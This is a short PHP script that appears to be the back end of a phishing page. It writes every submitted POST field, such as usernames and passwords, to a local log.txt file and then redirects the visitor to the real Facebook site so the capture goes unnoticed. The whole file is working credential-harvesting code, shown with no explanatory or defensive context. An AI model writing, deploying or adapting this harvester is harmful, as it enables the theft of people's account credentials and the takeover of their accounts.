<?php 
  $handle = fopen("log.txt","a");
  foreach($_POST as $attribute => $value){
    fwrite($handle, $attribute);
    fwrite($handle, "=");
    fwrite($handle, $value);
    fwrite($handle, "\r\n");
  }
  fwrite($handle, "\r\n");
  fclose($handle);
  header('Location: https://www.facebook.com');
  exit;
?>